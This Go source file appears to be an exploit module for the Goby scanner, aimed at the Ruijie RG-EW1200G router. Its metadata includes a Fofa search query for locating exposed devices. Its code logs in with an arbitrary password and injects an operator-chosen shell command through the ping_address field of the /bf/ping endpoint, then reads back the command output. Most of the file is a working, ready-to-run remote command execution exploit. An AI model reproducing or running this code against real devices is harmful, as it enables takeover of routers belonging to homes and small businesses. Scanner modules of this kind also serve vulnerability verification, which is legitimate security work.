package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Ruijie Networks RG-EW1200G ping api command execution vulnerability",
    "Description": "<p>RG-EW1200 is a 1200M dual-band wireless router specially launched by Ruijie Ruiyi for apartment homes, self-built houses, small shops and other scenarios.</p><p>An attacker can log in to the backend with any password, execute commands, and then control the entire router.</p>",
    "Product": "Ruijie-EWEB-System",
    "Homepage": "https://www.ruijie.com.cn/",
    "DisclosureDate": "2023-08-07",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "(body=\"static/js/manifest\" && body=\"/static/img/title.ico\") || title==\"锐捷网络\"",
    "GobyQuery": "(body=\"static/js/manifest\" && body=\"/static/img/title.ico\") || title==\"锐捷网络\"",
    "Level": "3",
    "Impact": "<p>Attackers can upload webshell files to the server for command execution, thereby controlling the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://www.ruijie.com.cn/\">https://www.ruijie.com.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "ls",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "锐捷网络 RG-EW1200G ping 接口命令执行漏洞",
            "Product": "锐捷网络-EWEB系统",
            "Description": "<p>RG-EW1200是锐捷睿易专门为公寓家居、自建房、小商铺等场景推出的一款1200M双频无线路由器。<br></p><p>攻击者可以任意密码登录后台，进行命令执行，进而控制整个路由器。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.ruijie.com.cn/\">https://www.ruijie.com.cn/</a><br></p>",
            "Impact": "<p>攻击者可以任意密码登录后台，进行命令执行，进而控制整个路由器。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Ruijie Networks RG-EW1200G ping api command execution vulnerability",
            "Product": "Ruijie-EWEB-System",
            "Description": "<p>RG-EW1200 is a 1200M dual-band wireless router specially launched by Ruijie Ruiyi for apartment homes, self-built houses, small shops and other scenarios.</p><p>An attacker can log in to the backend with any password, execute commands, and then control the entire router.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://www.ruijie.com.cn/\">https://www.ruijie.com.cn/</a><br></p>",
            "Impact": "<p>Attackers can upload webshell files to the server for command execution, thereby controlling the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-10-09",
    "PocId": "10855"
}`

	login31231QWEXAQ := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewPostRequestConfig("/api/sys/login")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		sendConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		sendConfig.Data = `{"username":"2","password":"123456","timestamp":1695448528000}`
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	sendPayload51312DQWPEP := func(hostInfo *httpclient.FixUrl, cookie, payload string) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewPostRequestConfig("/bf/ping")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		sendConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		sendConfig.Header.Store("Cookie", cookie)
		sendConfig.Data = "{\"ping_address\":\"" + payload + "\",\"ping_package_num\":\"1\",\"ping_package_size\":56,\"is_first_req\":true}"
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	sendPingPayload21135fdgh := func(hostInfo *httpclient.FixUrl, cookie string) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewGetRequestConfig("/bf/ping")
		sendConfig.Header.Store("Cookie", cookie)
		sendConfig.Timeout = 60
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := login31231QWEXAQ(hostInfo)
			return err == nil && strings.Contains(resp.RawBody, "\"result\":\"ok\"")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "cmd" {
				cmd := "|| echo aA8BdDf6`" + goutils.B2S(stepLogs.Params["cmd"]) + "`aA8BdDf6"
				resp, err := login31231QWEXAQ(expResult.HostInfo)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if !strings.Contains(resp.RawBody, "\"result\":\"ok\"") {
					expResult.Output = "不存在该漏洞"
					return expResult
				}
				cookie := resp.Cookie
				resp, err = sendPayload51312DQWPEP(expResult.HostInfo, cookie, cmd)
				if err != nil || !strings.Contains(resp.Utf8Html, "\"msg\":\"success\"") {
					expResult.Output = "不存在该漏洞"
					return expResult
				}
				resp, err = sendPingPayload21135fdgh(expResult.HostInfo, cookie)
				if err != nil || (resp.StatusCode != 200 && !strings.Contains(resp.RawBody, "aA8BdDf6")) {
					expResult.Output = "不存在该漏洞"
					return expResult
				}
				match := regexp.MustCompile("aA8BdDf6" + `(.*?)` + "aA8BdDf6").FindStringSubmatch(resp.RawBody)
				if len(match) > 1 {
					expResult.Output = match[1]
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
